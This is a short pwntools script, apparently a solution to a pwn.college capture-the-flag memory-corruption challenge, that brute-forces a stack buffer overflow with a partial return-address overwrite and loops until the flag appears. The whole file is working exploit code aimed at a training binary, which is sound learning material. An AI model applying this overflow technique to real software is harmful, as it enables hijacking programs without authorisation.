from pwn import *


while True:
    p = process("/challenge/babymem_level9.0")
    #context.terminal = ['tmux', 'splitw', '-h']
    #p = gdb.debug("/challenge/babymem_level6.1", gdbscript='continue')
    p.sendline(b"74")
    # cont = p.recvline(keepends="False")
    # cont = cont.decode()
    # print(cont)
    # if cont.startswith("Our stack pointer points to"):
    #     print("xxxx")
    #     rbp_addr = cont[cont.find("0x", cont.find("base pointer points")): cont.find(".")]
    #     break

    rbp_addr = 0x1768
    s=b"A"*(48) + b"\x47" +rbp_addr.to_bytes(2,"little")
    p.send(s)
    all = p.recvall()
    p.close()
    all = all.decode()
    print(all)
    if all.find("pwn.college{")!=-1:
        break

